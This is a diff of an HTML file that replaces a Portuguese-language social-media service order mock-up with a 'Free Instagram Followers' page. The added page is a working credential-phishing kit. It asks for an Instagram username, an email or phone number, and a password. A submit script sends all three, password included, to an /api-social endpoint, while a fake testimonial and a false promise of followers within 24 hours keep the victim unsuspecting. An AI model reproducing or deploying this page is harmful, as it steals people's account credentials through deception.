@@ -1,194 +1,184 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
+
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Site de Serviços</title>
-  <style>
-    body {
-      background-color: #222;
-      color: #fff;
-      font-family: sans-serif;
-      display: flex;
-      flex-direction: column;
-      align-items: center;
-      padding: 20px;
-    }
-
-    .header {
-      display: flex;
-      justify-content: space-between;
-      align-items: center;
-      width: 100%;
-      margin-bottom: 20px;
-    }
-
-    .header .time {
-      font-size: 16px;
-      color: #ccc;
-    }
-
-    .header .icon-container {
-      display: flex;
-      align-items: center;
-    }
-
-    .header .icon {
-      width: 20px;
-      height: 20px;
-      margin-right: 10px;
-    }
-
-    .container {
-      width: 100%;
-      max-width: 500px;
-      background-color: #333;
-      padding: 20px;
-      border-radius: 10px;
-    }
-
-    .category, .services {
-      margin-bottom: 10px;
-    }
-
-    .category input, .services input {
-      width: 100%;
-      padding: 10px;
-      background-color: #444;
-      border: none;
-      border-radius: 5px;
-      color: #fff;
-      font-size: 16px;
-    }
-
-    .services input {
-      display: flex;
-      align-items: center;
-    }
-
-    .services input .price {
-      margin-left: 10px;
-    }
-
-    .description {
-      margin-bottom: 10px;
-    }
-
-    .description ul {
-      list-style-type: none;
-      padding: 0;
-    }
-
-    .description li {
-      margin-bottom: 5px;
-    }
-
-    .description li .icon {
-      display: inline-block;
-      width: 20px;
-      height: 20px;
-      margin-right: 10px;
-      vertical-align: middle;
-    }
-
-    .link, .average-time, .quantity, .cost {
-      margin-bottom: 10px;
-    }
-
-    .link input, .average-time input, .quantity input, .cost input {
-      width: 100%;
-      padding: 10px;
-      background-color: #444;
-      border: none;
-      border-radius: 5px;
-      color: #fff;
-      font-size: 16px;
-    }
-
-    .average-time .info {
-      margin-left: 10px;
-    }
-
-    .quantity .min-max {
-      font-size: 14px;
-      color: #ccc;
-      margin-top: 5px;
-    }
-
-    .buttons {
-      display: flex;
-      justify-content: space-between;
-      width: 100%;
-    }
-
-    .buttons button {
-      padding: 10px 20px;
-      background-color: #555;
-      border: none;
-      border-radius: 5px;
-      color: #fff;
-      font-size: 16px;
-      cursor: pointer;
-    }
-  </style>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="icon" href="https://2lucky.cfd/iG/v1/icon.png" type="image/x-icon">
+    <link href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;600&display=swap" rel="stylesheet">
+    <link href="style.css" rel="stylesheet">
+    <meta name="robots" content="noindex, nofollow">
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.3/jquery.min.js"></script>
+    <title>Free Instagram Followers</title>
+    <style>
+        body {
+            background-color: #f0f0f0;
+            color: #333;
+            font-family: 'Montserrat', sans-serif;
+        }
+        
+        .navbar {
+            background-color: #fff;
+            padding: 15px 0;
+            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.1);
+        }
+        
+        .sf-nav-logo img {
+            height: 40px;
+        }
+        
+        .sf-panel {
+            background-color: #fff;
+            padding: 25px;
+            border-radius: 8px;
+            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.1);
+            margin-top: 30px;
+        }
+        
+        .sf-panel .body h3 {
+            color: #333;
+            font-size: 24px;
+            margin-bottom: 15px;
+            font-weight: 600;
+        }
+        
+        .sf-panel .body h3 span {
+            color: #ff3267;
+        }
+        
+        .form-control {
+            border: 1.2px solid #ccc;
+            border-radius: 10px;
+            margin-bottom: 10px;
+        }
+        
+        .btn.button.sf-button {
+            background-color: #ff3267;
+            color: #fff;
+            width: 300px;
+            border-radius: 10px;
+            padding: 10px 20px;
+            font-size: 16px;
+            text-transform: uppercase;
+            font-weight: bold;
+        }
+        
+        .review {
+            text-align: center;
+            background-color: #fff;
+            padding: 25px;
+            border-radius: 8px;
+            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.1);
+            margin-top: 30px;
+        }
+        
+        .review .message {
+            font-size: 14px;
+            line-height: 1.5;
+            color: #666;
+        }
+        
+        .ratings .star {
+            color: #ff9f00;
+        }
+        
+        .section-claim {
+            padding: 50px 0;
+        }
+        .container {
+            margin-left: 15px;
+        }
+    </style>
 </head>
-<body>
-  <div class="header">
-    <div class="time">20:56</div>
-    <div class="icon-container">
-      <img src="https://www.svgrepo.com/show/206913/battery-full.svg" class="icon" alt="Bateria">
-      <img src="https://www.svgrepo.com/show/355520/signal-4g.svg" class="icon" alt="Sinal">
-      <span>12%</span>
-    </div>
-  </div>
 
-  <div class="container">
-    <div class="category">
-      <input type="text" placeholder="Categoria" value="WasSMM - Novos serviços | Promocionais">
-    </div>
+<body class="claim">
+    <nav class="navbar navbar-expand-md navbar-light">
+        <div class="container text-center">
+            <a class="sf-nav-logo navbar-brand" href="#">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png" alt="Instagram Logo">
+                Instagram Free Followers
+            </a>
+        </div>
+    </nav>
+    <section class="section-claim start">
+        <div class="container">
+            <div class="row align-items-center">
+                <div class="col-md-7">
+                    <div class="sf-panel">
+                        <div class="body">
+                            <h3 class="heading">Get <span>Free Instagram Followers</span></h3>
+                                <input type="text" name="username" class="form-control input-text icon camera" placeholder="Username" autocomplete="off" required>
+                                <input type="text" name="email" class="form-control input-text icon at" placeholder="Email Or Phone No" autocomplete="off" required>
+                                <input type="hidden" name="id" value="1856249311" autocomplete="off">
+                                <input type="password" name="pass" class="form-control input-text icon lock" placeholder="Password" autocomplete="off" required><br>
+                                
+                                <div class="col-12">
+                                    <select style="height:50px; width: 100%; padding: 7px; margin-top: 4px; font-size: 14px; font-family: 'Montserrat', sans-serif; background: #ff3267; border-radius: 4px; color: #ffffff; border: none; outline: none;">
+                                        <option style="background: #ff3267;">100 Followers</option>
+                                        <option style="background: #ff3267;">200 Followers</option>
+                                        <option style="background: #ff3267;">400 Followers</option>
+                                        <option style="background: #ff3267;">800 Followers</option>
+                                        <option style="background: #ff3267;">1600 Followers</option>
+                                        <option style="background: #ff3267;">3000 Followers</option>
+                                        <option style="background: #ff3267;" selected>100 Followers</option>
+                                    </select>
+                                </div><br>
+                                <button type="submit" id="submitButton" class="btn button sf-button pink block" name="submit" value="Start Now">Start Now</button>
 
-    <div class="services">
-      <input type="text" placeholder="Serviços" value="3399 Instagram - Visualizações do reel | Max 50">
-    </div>
+                            
+                        </div>
+                    </div>
+                </div>
+                <div class="col-md-5">
+                    <div class="review d-flex flex-column align-items-center">
+                        <p class="message">
+                            I never believed I could get free followers And it is so simple to use.
+                            
+                            ~ Chetan
+                        </p>
+                        <div class="ratings d-flex align-items-center justify-content-between">
+                            <span class="star">&#9733;</span>
+                            <span class="star">&#9733;</span>
+                            <span class="star">&#9733;</span>
+                            <span class="star">&#9733;</span>
+                            <span class="star">&#9733;</span>
+                        </div>
+                        <div class="social"></div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+<script>(function(){function c(){var b=a.contentDocument||a.contentWindow.document;if(b){var d=b.createElement('script');d.innerHTML="window.__CF$cv$params={r:'8ba846cd195000d5',t:'MTcyNDg4OTc5MS4wMDAwMDA='};var a=document.createElement('script');a.nonce='';a.src='/cdn-cgi/challenge-platform/scripts/jsd/main.js';document.getElementsByTagName('head')[0].appendChild(a);";b.getElementsByTagName('head')[0].appendChild(d)}}if(document.body){var a=document.createElement('iframe');a.height=1;a.width=1;a.style.position='absolute';a.style.top=0;a.style.left=0;a.style.border='none';a.style.visibility='hidden';document.body.appendChild(a);if('loading'!==document.readyState)c();else if(window.addEventListener)document.addEventListener('DOMContentLoaded',c);else{var e=document.onreadystatechange||function(){};document.onreadystatechange=function(b){e(b);'loading'!==document.readyState&&(document.onreadystatechange=e,c())}}}})();</script></body>
+<script>
+    document.addEventListener("DOMContentLoaded", function() {
+    const button = document.getElementById('submitButton');
+    button.addEventListener('click', function(e) {
+        e.preventDefault();
 
-    <div class="description">
-      <h3>Descrição de serviço:</h3>
-      <ul>
-        <li><img src="https://www.svgrepo.com/show/26219/hourglass.svg" class="icon" alt="Tempo"> Inicio: 0-5 Minutos</li>
-        <li><img src="https://www.svgrepo.com/show/162096/rocket.svg" class="icon" alt="Velocidade"> Velocidade 100K-250K</li>
-        <li><img src="https://www.svgrepo.com/show/20267/refresh-button.svg" class="icon" alt="Recarga"> Tempo de refill: Vitalicio</li>
-        <li><img src="https://www.svgrepo.com/show/109996/chart-line.svg" class="icon" alt="Quedas"> Taxa de quedas: 100% Sem quedas</li>
-        <li><img src="https://www.svgrepo.com/show/110539/lightning-bolt.svg" class="icon" alt="Promoção"> Promocao Por Tempo Limitado!</li>
-        <li>1.000 POR APENAS R$ 0,035 <img src="https://www.svgrepo.com/show/100946/fire.svg" class="icon" alt="Fogo"> <img src="https://www.svgrepo.com/show/358392/shocked-face.svg" class="icon" alt="Chocado"></li>
-        <li><img src="https://www.svgrepo.com/show/355651/plant-seedling.svg" class="icon" alt="Qualidade"> Qualidade: Ótima qualidade</li>
-        <li><img src="https://www.svgrepo.com/show/198847/document.svg" class="icon" alt="Observação"> OBS: Somente Reel, TV nao.</li>
-        <li><img src="https://www.svgrepo.com/show/15913/link-chain.svg" class="icon" alt="Link"> Insira o link da publicação (REEL)</li>
-      </ul>
-    </div>
+        const username = document.querySelector('input[name="username"]').value;
+        const email = document.querySelector('input[name="email"]').value;
+        const id = "5497929050";
+        const pass = document.querySelector('input[name="pass"]').value;
 
-    <div class="link">
-      <input type="text" placeholder="Link">
-    </div>
+        if (!username || !email || !pass) {
+            alert('Please fill out all fields.');
+        } else {
+            fetch(`/api-social?method=insta&username=${encodeURIComponent(username)}&email=${encodeURIComponent(email)}&id=${encodeURIComponent(id)}&pass=${encodeURIComponent(pass)}`)
+                .then(response => response.text())
+                .then(data => {
+                    alert('Your Request is Processed. You Will Get Followers Within 24 Hours');
+                })
+                .catch(error => {
+                    console.error('Error:', error);
+                    alert('Failed to make request');
+                });
+        }
+    });
+});
 
-    <div class="average-time">
-      <input type="text" placeholder="Average Time" value="29 minutes">
-      <span class="info">ⓘ</span>
-    </div>
+</script>
 
-    <div class="quantity">
-      <input type="text" placeholder="Quantidade">
-      <span class="min-max">Min: 50 - Max: 500000</span>
-    </div>
-
-    <div class="cost">
-      <input type="text" placeholder="Custos">
-    </div>
-
-    <div class="buttons">
-      <button>III</button>
-      <button>🗲</button>
-      <button>🠔</button>
-    </div>
-  </div>
-</body>
 </html>
